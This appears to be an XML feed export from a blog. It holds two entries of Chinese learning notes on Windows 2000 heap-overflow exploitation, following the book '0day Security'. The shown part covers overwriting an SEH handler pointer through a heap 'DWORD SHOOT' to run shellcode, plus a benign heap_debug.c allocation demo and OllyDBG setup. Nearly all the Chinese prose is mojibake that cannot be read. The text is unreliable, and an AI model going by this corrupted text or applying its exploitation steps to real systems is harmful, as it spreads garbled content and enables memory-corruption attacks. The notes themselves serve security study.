chain‰∏≠Âπ∂Ê≤°ÊúâÂú®Êàë‰ª¨ÁöÑÁ®ãÂ∫èÂèëÁîüÂ†ÜÊ∫¢Âá∫ÂºÇÂ∏∏Êó∂ÈúÄË¶ÅÁî®Âà∞ÁöÑÁ¨¨‰∏Ä‰∏™S.E.H„ÄÇÈúÄË¶ÅÊé•ÁùÄÊâßË°å‰ª£Á†ÅÁõ¥Âà∞Ë∞ÉÁî®Ë°åÁöÑHeapAlloc()ÂáΩÊï∞ÔºåËøôÊó∂‰ºöÂá∫Áé∞ÂºÇÂ∏∏ÔºåÊåá‰ª§Á™óÂè£‰ºö‰ªéÁî®Êà∑Á®ãÂ∫è‰ª£Á†ÅËΩ¨ÂÖ•ntdll.dll‰∏≠ÁöÑÂÜÖÊ†∏‰ª£Á†ÅÔºåÊ≠§Êó∂ÂÜçËßÇÂØüS.E.H chainÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-2/2_2_2_3.png" class="" title="Âõæ2.2.2.3"><p>ËßÇÂØü‰∏äÂõæÔºå0x0012FF2CÂç≥‰∏∫Â§ÑÁêÜÊú¨Á®ãÂ∫èÁ¨¨‰∏Ä‰∏™ÂºÇÂ∏∏ÁöÑS.E.HÁöÑÂú∞ÂùÄÔºåÂâçÈù¢‰ªãÁªçËøáÔºåS.E.HÊòØ‰∏™ÁªìÊûÑ‰ΩìÔºåÂÖ∂‰∏≠ÂÖàÂêéÂåÖÂê´ÁùÄ‰∏ã‰∏Ä‰∏™S.E.HÁöÑÊåáÈíàÂíåÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÊåáÈíàÔºåÂõ†Ê≠§ÔºåÊàë‰ª¨DWORD SHOOTÁöÑÁõÆÊ†áÂú∞ÂùÄ‰∏∫ (0x0012FF2C + 4) = 0x0012FF30„ÄÇ</p><p>Êé•ÁùÄÔºå‰øÆÊîπC‰ª£Á†ÅÁ¨¨18Ë°åshellcode‰∏≠DWORD SHOOTÁöÑÁõÆÊ†áÂú∞ÂùÄ‰∏∫301200ÔºåÊ≥®ÈáäÊéâÁ¨¨33Ë°åÁöÑINT3‰∏≠Êñ≠ÔºåÈáçÊñ∞ÁºñËØëÊâßË°åÔºåÊàêÂäüÂºπÁ™ó„ÄÇ</p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåËøôÊ¨°Êàë‰ª¨‰æùÁÑ∂ÈúÄË¶ÅÊ≥®ÈáäÊéâINT3ÔºåÂê¶ÂàôÁºñËØëÊâßË°åÂêéËøõÂÖ•OllyDBGË∞ÉËØïÂêéËøêË°åÔºåÁ®ãÂ∫èÊòØ‰∏ç‰ºöÊ≠£Â∏∏ÂºπÁ™óÁöÑÔºåÂÖ∂ÂéüÂõ†Âú®0day‰π¶‰∏≠ÂêéÊñá‰∏≠ÊúâÊèêÂà∞Ôºö</p><blockquote><p>ÂΩìÂºÇÂ∏∏ÂèëÁîüÊó∂ÔºåÁ≥ªÁªü‰ºöÈ°∫ÁùÄS.E.HÈìæË°®ÊêúÁ¥¢ËÉΩÂ§üÂ§ÑÁêÜÂºÇÂ∏∏ÁöÑÂè•ÊüÑÔºõ‰∏ÄÊó¶ÊâæÂà∞‰∫ÜÊÅ∞ÂΩìÁöÑÂè•ÊüÑÔºåÁ≥ªÁªü‰ºöÂ∞ÜÂ∑≤ÁªèÈÅçÂéÜËøáÁöÑS.E.H‰∏≠ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÂÜçË∞ÉÁî®‰∏ÄÈÅçÔºåËøô‰∏™ËøáÁ®ãÂ∞±ÊòØÊâÄË∞ìÁöÑunwindÊìç‰ΩúÔºåÁ¨¨‰∫åËΩÆÂú∞Ë∞ÉÁî®Â∞±ÊòØunwindË∞ÉÁî®„ÄÇ</p><p>unwindÊìç‰ΩúÈÄöËøákernel32.dll‰∏≠ÁöÑ‰∏Ä‰∏™ÂØºÂá∫ÂáΩÊï∞RtlUnwindÂÆûÁé∞ÔºåÂÆûÈôÖ‰∏äkernel32.dll‰ºöËΩ¨ËÄåÂÜçÂéªË∞ÉÁî®ntdll.dll‰∏≠ÁöÑÂêåÂêçÂáΩÊï∞„ÄÇ</p><p>ÊúÄÂêéÔºåËøòË¶ÅÂ†ÜÊ†à‰∏≠ÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂÅöÊúÄÂêé‰∏ÄÁÇπË°•ÂÖÖÔºöÂú®‰ΩøÁî®ÂõûË∞ÉÂáΩÊï∞‰πãÂâçÔºåÁ≥ªÁªü‰ºöÂà§Êñ≠ÂΩìÂâçÊòØÂê¶Â§Ñ‰∫éË∞ÉËØïÁä∂ÊÄÅÔºåÂ¶ÇÊûúÂ§Ñ‰∫éË∞ÉËØïÁä∂ÊÄÅÔºåÂ∞ÜÊääÂºÇÂ∏∏‰∫§ÁªôË∞ÉËØïÂô®Â§ÑÁêÜ„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P188-190</cite></footer></blockquote><p>‰ªé‰∏äÊñáÁöÑËß£ÈáäÂ∞±ÂèØ‰ª•ÊòéÁôΩ‰∏∫‰ªÄ‰πàÊàë‰ª¨ÁöÑ‰ª£Á†Å‰ºöËß¶ÂèëÂºÇÂ∏∏Âêé‰ºöËøõÂÖ•ntdllÁöÑ‰ª£Á†ÅÊâßË°åÔºåËÄå‰∏î‰πüËÉΩËß£Èáä‰∏∫‰ªÄ‰πà‰øùÁïôINT3ÁºñËØëÊâßË°åÂêé‰∏ç‰ºöÂºπÁ™ó‰∫ÜÔºåÂõ†‰∏∫Âú®Â§ÑÁêÜÂºÇÂ∏∏Êó∂Á≥ªÁªüÊ£ÄÊµãÂà∞ÂΩìÂâçÂ§Ñ‰∫éË∞ÉËØïÂô®‰∏≠ÔºåÂõ†Ê≠§ÊääËØ•ÂºÇÂ∏∏‰∫§ÁªôË∞ÉËØïÂô®Â§ÑÁêÜ‰∫ÜÔºåËÄåOllyDBGË∑üÁ≥ªÁªüÂ§ÑÁêÜÂºÇÂ∏∏ÁöÑÊñπÂºè‰∏çÂêåÔºåÂÆÉÂπ∂Ê≤°ÊúâË∞ÉÁî®Á≥ªÁªüÁöÑÂºÇÂ∏∏Â§ÑÁêÜÂáΩÊï∞ÔºåÂõ†Ê≠§Êàë‰ª¨ÁöÑshellcodeÊ≤°ÊúâÂæóÂà∞ÊâßË°å„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Bin </tag>
            
            <tag> Heap Overflow </tag>
            
            <tag> OllyDBG </tag>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Windows 2000 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Â†ÜÊ∫¢Âá∫Â≠¶‰π†Á¨îËÆ∞(Win2K) (‰∏ä)</title>
      <link href="/tech/heap-overflow-learning-notes-1/"/>
      <url>/tech/heap-overflow-learning-notes-1/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #1</strong></em></li><li>Author: dog2</li></ul><hr /><p>ÊúÄËøëÂú®ÂïÉ„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„ÄãÔºàÁ¨¨‰∫åÁâàÔºâ‰∏Ä‰π¶ÔºåÊâìÁÆóÂÖ•Èó®‰∫åËøõÂà∂ÊºèÊ¥ûÂàÜÊûê„ÄÇ‰π¶‰∏≠Á¨¨‰∫îÁ´†‚ÄúÂ†ÜÊ∫¢Âá∫Âà©Áî®‚ÄùËæÉÂâçÂá†Á´†ÈöæÂ∫¶ÊúâÊâÄÂ¢ûÂ§ßÔºåÂéüÂõ†Âú®‰∫éÂ†ÜÁªìÊûÑËæÉ‰πãÂâçÂ≠¶‰π†ÁöÑÊ†àÊõ¥Â§çÊùÇÔºåÁ¨¨‰∫îÁ´†‰∏≠ÁöÑ‰æãÂ≠êÊ∂µÁõñ‰∫ÜÂ†ÜÁöÑÂàÜÂ∏É„ÄÅÂ†ÜÂùóÂàÜÈÖçÂíåÈáäÊîæ„ÄÅÂ†ÜÊ∫¢Âá∫Âà©Áî®ÔºåÂà©Áî®Â†ÜÊ∫¢Âá∫ËøõË°åÊîªÂáªÁöÑ‰æãÂ≠êÊòØÈÄöËøá‰øÆÊîπP.E.BÔºàËøõÁ®ãÁéØÂ¢ÉÂùóÔºâ‰∏≠ÊåáÂêëRtlEnterCriticalSection()ÂáΩÊï∞ÁöÑÊåáÈíàÔºåËØ•ÂáΩÊï∞Âú®Á®ãÂ∫èÈÄÄÂá∫Êó∂Ë¢´Ë∞ÉÁî®„ÄÇÂú®Ë∞ÉËØïÂÆåÊâÄÊúâ‰æãÂ≠ê‰ª•ÂêéÔºåÂØπÂ†ÜÁöÑÂÜÖÈÉ®ÁªÜËäÇÂíåÂ†ÜÊ∫¢Âá∫Âà©Áî®Áªà‰∫éÊúâ‰∫Ü‰∫õËÆ∏ÁöÑÁêÜËß£„ÄÇ</p><p>Á¨¨ÂÖ≠Á´†‰∏≠‰πüÊ∂âÂèäÂà∞Â†ÜÊ∫¢Âá∫Âà©Áî®Ôºå‰∏çËøáÊ≠§Â§ÑÊòØÂà©Áî®WindowsÂºÇÂ∏∏Â§ÑÁêÜÊú∫Âà∂S.E.HÔºàÂºÇÂ∏∏Â§ÑÁêÜÁªìÊûÑ‰ΩìÔºâÊù•ÂÆûÁé∞ÊîªÂáªÁöÑÔºåÁúãÂÆåÂêéÊâìÁÆóË∞ÉËØï‰∏ÄÈÅçÔºåÂèëÁé∞Âá†Â§©ÂâçÈÄöËøáË∞ÉËØïÂª∫Á´ãÁöÑÂØπÂÜÖÂ≠ò‰∏≠Â†ÜÂàÜÂ∏ÉÂíåÊìç‰ΩúÁöÑÁêÜËß£ÈÉΩÂøòÂæóÂ∑Æ‰∏çÂ§ö‰∫ÜÔºåËøôÊó∂ÂÄôÁªà‰∫é‰Ωì‰ºöÂà∞ <em><strong>Â≠¶‰π†ËøáÁ®ã‰∏≠Ê†πÊçÆËá™Â∑±ÁöÑ‰Ωì‰ºöÂÅö‰∏Ä‰∫õÈáçË¶ÅÁ¨îËÆ∞Âπ∂‰∏îÊçÆÊ≠§ÂÆöÊúüÂ§ç‰π†ÁöÑÈáçË¶ÅÊÄß</strong></em>ÔºåÂõ†Ê≠§Êúâ‰∫ÜÊú¨ÁØá„ÄÇ</p><p>Â∏åÊúõËøôÊòØ‰∏™Â•ΩÁöÑÂºÄÂ§¥ÔºåÊèêÈÜíËá™Â∑±Ë∞®ËÆ∞ÂØπ‰∫éÂ§çÊùÇÁöÑÈáçÈöæÁÇπÔºåË¶Å‰ª•Êó•ÂøóÁöÑÂΩ¢ÂºèÂΩ¢ÊàêÂ≠¶‰π†Á¨îËÆ∞Ôºå‰ª•‰æõÊó•ÂêéÊ∏©ÊïÖÁü•Êñ∞„ÄÇ</p><p>ÂÖ≥‰∫éÂ†Ü‰ª•ÂèäP.E.B„ÄÅS.E.HÁ≠âÊú∫Âà∂ÁöÑ‰ªãÁªçÔºå0day‰π¶‰∏≠Â∑≤ÁªèÈùûÂ∏∏Á≥ªÁªüËØ¶Â∞ΩÔºåÊú¨Êñá‰∏çÂÜçËµòËø∞ÔºåËøôÈáå‰ªÖÁªôÂá∫ÊàëÁöÑÂÆûÈ™åË∞ÉËØïËøáÁ®ãÔºåËÆ∞ÂΩïÂÖ∂‰∏≠Ë∏©ÁöÑÂùë‰ª•Âèä‰∏Ä‰∫õ‰Ωì‰ºöÔºåÂõ†Ê≠§‰ª•ËøáÁ®ãÊà™Âõæ‰∏∫‰∏ªÔºåÁõ∏ÂÖ≥ÁÆÄËø∞‰∏∫ËæÖ„ÄÇÁ¨¨ÂÖ≠Á´†‰∏≠Â†ÜÁöÑ‰æãÂ≠ê‰ΩúËÄÖÂπ∂Ê≤°ÊúâÁªôÂá∫Áõ∏ÂÖ≥‰ª£Á†ÅÂèäËøáÁ®ãÁªÜËäÇÔºåËøôÈáå‰πü‰ºöÈôÑ‰∏ä„ÄÇÁî±‰∫éÂàùÂ≠¶ÔºåÊñá‰∏≠ÈöæÂÖçÂ≠òÂú®ÈîôËØØÔºåÊ¨¢ËøéÊåáÊ≠£„ÄÇ</p><a id="more"></a><h2 id="x00-ÂáÜÂ§áÂ∑•‰Ωú">0x00 ÂáÜÂ§áÂ∑•‰Ωú</h2><blockquote><p>Ë∞ÉËØïÂ†Ü‰∏éË∞ÉËØïÊ†à‰∏çÂêåÔºå‰∏çËÉΩÁõ¥Êé•Áî®Ë∞ÉËØïÂô®OllyDBG„ÄÅWinDBGÊù•Âä†ËΩΩÁ®ãÂ∫èÔºåÂê¶ÂàôÂ†ÜÁÆ°ÁêÜÂáΩÊï∞‰ºöÊ£ÄÊµãÂà∞ÂΩìÂâçËøõÁ®ãÂ§Ñ‰∫éË∞ÉËØïÁä∂ÊÄÅÔºåËÄå‰ΩøÁî®Ë∞ÉËØïÊÄÅÂ†ÜÁÆ°ÁêÜÁ≠ñÁï•„ÄÇ</p><p>Ë∞ÉËØïÊÄÅÂØπÁÆ°ÁêÜÁ≠ñÁï•ÂíåÂ∏∏ÊÄÅÂ†ÜÁÆ°ÁêÜÁ≠ñÁï•ÊúâÂæàÂ§ßÂ∑ÆÂºÇ„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P153</cite></footer></blockquote><p>Âõ†Ê≠§ÈúÄË¶ÅÈò≤Ê≠¢Á®ãÂ∫èËøêË°åÂêéËøõÂÖ•Ë∞ÉËØïÊÄÅÔºåÊåâÁÖß‰π¶‰∏≠ÊâÄËø∞‰ª•Â¶Ç‰∏ãÊñπÂºèËÆæÁΩÆÔºö</p><ul><li>ËÆæÁΩÆOllyDBG‰∏∫ÈªòËÆ§Ë∞ÉËØïÂô®ÔºöOllyDBG -&gt; OptionsËèúÂçï -&gt; Just-in-time debugging</li></ul><img src="/tech/heap-overflow-learning-notes-1/0_1.png" class="" title="Âõæ0.1"><ul><li>ËÆæÁΩÆOllyDBG ‰∏çÊçïËé∑INT3‰∏≠Êñ≠ÔºöOllyDBG -&gt; OptionsËèúÂçï -&gt; Debugging options</li></ul><img src="/tech/heap-overflow-learning-notes-1/0_2.png" class="" title="Âõæ0.2"><h2 id="x01-ÂàùËØÜÂ†Ü">0x01 ÂàùËØÜÂ†Ü</h2><hr /><blockquote><p>Âú®Windows‰∏≠ÔºåÂç†Áî®ÊÄÅÁöÑÂ†ÜÂùóË¢´‰ΩøÁî®ÂÆÉÁöÑÁ®ãÂ∫èÁ¥¢ÂºïÔºåËÄåÂ†ÜË°®Âè™Á¥¢ÂºïÊâÄÊúâÁ©∫Èó≤ÊÄÅÁöÑÂ†ÜÂùó„ÄÇÂÖ∂‰∏≠ÊúÄÈáçË¶ÅÁöÑÂ†ÜË°®Êúâ‰∏§ÁßçÔºöÁ©∫Èó≤ÂèåÂêëÈìæË°®FreelistÔºà‰ª•‰∏ãÁÆÄÁß∞Á©∫Ë°®ÔºâÂíå Âø´ÈÄüÂçïÂêëÈìæË°®LookasideÔºà‰ª•‰∏ãÁÆÄÁß∞Âø´Ë°®Ôºâ„ÄÇ</p><p>Â†ÜÁöÑÊìç‰Ωú‰∏≠ÂèØ‰ª•ÂàÜ‰∏∫Â†ÜÂùóÂàÜÈÖç„ÄÅÂ†ÜÂùóÈáäÊîæÂíåÂ†ÜÂùóÂêàÂπ∂ÔºàCoalesceÔºâ‰∏âÁßç„ÄÇÂÖ∂‰∏≠Ôºå‚ÄúÂàÜÈÖç‚ÄùÂíå‚ÄúÈáäÊîæ‚ÄùÊòØÂú®Á®ãÂ∫è_ÔºàÂç≥Âú®Áî®Êà∑‰ª£Á†Å‰∏≠Ôºâ_Êèê‰∫§Áî≥ËØ∑ÂíåÊâßË°åÁöÑÔºåËÄåÂ†ÜÂùóÂêàÂπ∂ÂàôÊòØÊúâÂØπÁÆ°ÁêÜÁ≥ªÁªüËá™Â∑±ÂÆåÊàêÁöÑ„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P147 & P149</cite></footer></blockquote><p>‰∏ãÈù¢ËßÇÂØüÁ©∫Ë°®ÁöÑÂàÜÈÖç„ÄÅÈáäÊîæÂèäÂêàÂπ∂ÔºåÂø´Ë°®‰∏≠Ê≤°ÊúâÂêàÂπ∂Êìç‰ΩúÔºåÂõ†Ê≠§ËßÇÂØüÂÆÉÁöÑÂàÜÈÖçÂèäÈáäÊîæ„ÄÇ</p><h3 id="Á©∫Èó≤ÂèåÂêëÈìæË°®freelist">1. Á©∫Èó≤ÂèåÂêëÈìæË°®Freelist</h3><p>Á§∫‰æã‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight c"><figcaption><span>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P152 -> heap_debug.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC code of chapter 6.2 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name: heap_debug.c</span></span><br><span class="line"><span class="comment">author: failwest  </span></span><br><span class="line"><span class="comment">date: 2007.04.04</span></span><br><span class="line"><span class="comment">description: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed:1 only run on windows 2000</span></span><br><span class="line"><span class="comment">2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">3 build into release version</span></span><br><span class="line"><span class="comment">4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version: 1.0</span></span><br><span class="line"><span class="comment">E-mail: failwest@gmail.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//free block and prevent coaleses</span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line"></span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁºñËØëÁéØÂ¢ÉÂ¶Ç‰∏ãÔºö</p><ul><li>Êìç‰ΩúÁ≥ªÁªüÔºöËøêË°å‰∫éVmwareËôöÊãüÊú∫ÔºåÁâàÊú¨Win 2K SP4 5.00.2195 EN</li><li>ÁºñËØëÂô®ÔºöVisual C++ 6.0</li><li>ÁºñËØëÈÄâÈ°πÔºöÈªòËÆ§ÈÄâÈ°π</li><li>buildÁâàÊú¨ÔºöreleaseÁâà</li></ul><p>ËøêË°åÁ®ãÂ∫èÔºåÁî±‰∫éINT3‰∏≠Êñ≠‰∫ßÁîüÂºÇÂ∏∏ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_1.png" class="" title="Âõæ1.1.1"><p>ÈÄâÊã©Cancel‰ª•Âä†ËΩΩÈªòËÆ§Ë∞ÉËØïÂô®OllyDBG„ÄÇ</p><h4 id="ÂØªÊâæ‰ª£Á†ÅheapcreateÊâÄÂàõÂª∫ÁöÑÂ†Ü">(1) ÂØªÊâæ‰ª£Á†ÅHeapCreate()ÊâÄÂàõÂª∫ÁöÑÂ†Ü</h4><p>ËøõÂÖ•OllyDBGÂêéÔºåÂçïÂáª‰∏ãÂõæ‰∏≠ÁöÑMÊåâÈíÆÔºå‰ª•Êü•ÁúãÁ®ãÂ∫èÂΩìÂâçÁöÑÂÜÖÂ≠òÊò†Â∞ÑÁä∂ÊÄÅÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_2.png" class="" title="Âõæ1.1.2"><p>‰∏é‰∏äÂõæÂØπÂ∫îÁöÑ0day‰π¶‰∏≠Âõæ5.2.5ÊåáÂá∫‰∫ÜÂÜÖÂ≠òÊò†Â∞ÑMemory Map‰∏≠ËøõÁ®ãÂ†Ü„ÄÅmalloc‰ΩøÁî®Â†Ü„ÄÅÂÆûÈ™å‰∏≠HeapCreate()ÂàõÂª∫ÁöÑÂ†ÜÁöÑËµ∑ÂßãÂú∞ÂùÄÔºå‰ΩúËÄÖÊ≤°ÊúâËØ¥ÊòéÂêé2‰∏™ÊòØÂ¶Ç‰ΩïÂà§Êñ≠ÁöÑÔºåÊàëÁöÑÁêÜËß£Â¶Ç‰∏ãÔºö</p><ul><li>malloc‰ΩøÁî®Â†ÜÔºöËøôÈáåÊàëËøòÊó†Ê≥ïÂà§Êñ≠ÔºåÂõ†‰∏∫‰∏äÂõæÁöÑÂÜÖÂ≠òÊò†Â∞ÑÊÉÖÂÜµË∑ü‰π¶‰∏≠ÁöÑÂõæÊúâËæÉÂ§ß‰∏çÂêå„ÄÇ</li><li>ÂÆûÈ™å‰∏≠HeapCreate()ÂàõÂª∫ÁöÑÂ†ÜÔºöÂèØÁî®Ê†πÊçÆÂ§ßÂ∞è‰∏∫0x1000‰ª•ÂèäType‰∏∫PrivÊù•Á≠õÈÄâÔºå0x0012D000ËôΩÁÑ∂‰πüÊª°Ë∂≥Ôºå‰ΩÜÊòØÂú∞ÂùÄÂæàÂ∞èÔºåÂú®Á∫øÁ®ãÂèäËøõÁ®ãÂ†ÜÈôÑËøëÔºåÂ∫îËØ•‰∏çÊòØÁî®Êà∑ÊâÄÂàõÂª∫ÁöÑÂ†Ü„ÄÇÂõ†Ê≠§ÂèØÁî®Á≠õÈÄâÂá∫0x00360000‰∏∫Á®ãÂ∫è‰ª£Á†ÅÂàõÂª∫ÁöÑÂ†Ü„ÄÇ</li></ul><p>‰∏äÈù¢ËÆ®ËÆ∫ÁöÑÊòØÂè™Ê†πÊçÆËßÇÂØüMemory mapÊù•ËØÜÂà´ÂêÑÁßçÁ±ªÂûãÁöÑÂ†ÜÔºåÂÖ∂ÂÆûÊú¨‰æã‰∏≠Ë¶ÅÂà§Êñ≠HeapCreate()ÂàõÂª∫ÁöÑÂ†ÜÂèØÁõ¥Êé•Ê†πÊçÆÂΩìÂâçÊ±áÁºñ‰ª£Á†ÅËøêË°åÂà∞INT3Êó∂EAXÁöÑÂÄºÊù•Âà§Êñ≠ÔºåÂç≥‰∏∫0x00360000ÔºåÂõ†‰∏∫Âú®INT3‰ª£Á†Å‰πãÂâçÂàöÂàöË∞ÉÁî®‰∫ÜHeapCreate()ÂáΩÊï∞ÔºåÂπ∂‰∏îËøîÂõû‰∫ÜÂàõÂª∫ÁöÑÂ†ÜÁöÑÂÖ∂ÂÆûÂú∞ÂùÄÔºåËØ•ÂÄºÊ≠£Â≠òÂÇ®Âú®EAX‰∏≠ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_3.png" class="" title="Âõæ1.1.3"><h4 id="ËßÇÂØüÂ†ÜË°®‰ø°ÊÅØ">(2) ËßÇÂØüÂ†ÜË°®‰ø°ÊÅØ</h4><blockquote><p>Á©∫Èó≤Â†ÜÂùóÁöÑÂùóÈ¶ñ‰∏≠ÂåÖÂê´‰∏ÄÂØπÈáçË¶ÅÊåáÈíàÔºåËøôÂØπÊåáÈíàÁî®‰∫éÂ∞ÜÁ©∫Èó≤Â†ÜÂùóÁªÑÁªáÊàêÂèåÂêëÈìæË°®„ÄÇÊåâÁÖßÂ†ÜÂùóÁöÑÂ§ßÂ∞è‰∏çÂêåÔºåÁ©∫Ë°®ÊÄªÂÖ±Ë¢´ÂàÜ‰∏∫128Êù°„ÄÇ</p><p>Â†ÜÂå∫‰∏ÄÂºÄÂßãÁöÑÂ†ÜË°®Âå∫‰∏≠Êúâ‰∏Ä‰∏™128È°πÁöÑÊåáÈíàÊï∞ÁªÑÔºåË¢´Áß∞ÂÅöÁ©∫Ë°®Á¥¢ÂºïÔºàFreelist arrayÔºâ„ÄÇËØ•Êï∞ÁªÑÁöÑÊØè‰∏ÄÈ°πÂåÖÊã¨‰∏§‰∏™ÊåáÈíàÔºåÁî®‰∫éÊ†áËØÜ‰∏Ä‰∏™Á©∫Ë°®„ÄÇ</p><footer><strong>ÁéãÊ∏Ö</strong><cite>„Ää0dayÂÆâÂÖ®ÔºöËΩØ‰ª∂ÊºèÊ¥ûÂàÜÊûêÊäÄÊúØ„Äã(Á¨¨‰∫åÁâà) -> P147</cite></footer></blockquote><p>Âú®ÂÜÖÂ≠òÊü•ÁúãÁ™óÂè£‰∏≠ÔºåCtrl+GÊù•Âà∞Âú∞ÂùÄ0x00360000Â§ÑÔºåËßÇÂØüÂÜÖÂ≠òÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_1_4.png" class="" title="Âõæ1.1.4"><p>ÊåâÁÖß‰π¶‰∏≠‰ªãÁªçÔºå‰ªé0x00360000ÂºÄÂßãÔºåÂ†ÜË°®‰∏≠ÂåÖÂê´ÁöÑ‰ø°ÊÅØ‰æùÊ¨°‰∏∫</p><ul><li>ÊÆµË°®Á¥¢Âºï Segment List</li><li>ËôöË°®Á¥¢Âºï Virtual Allocation list</li><li>Á©∫Ë°®‰ΩøÁî®Ê†áËØÜ freelist usage 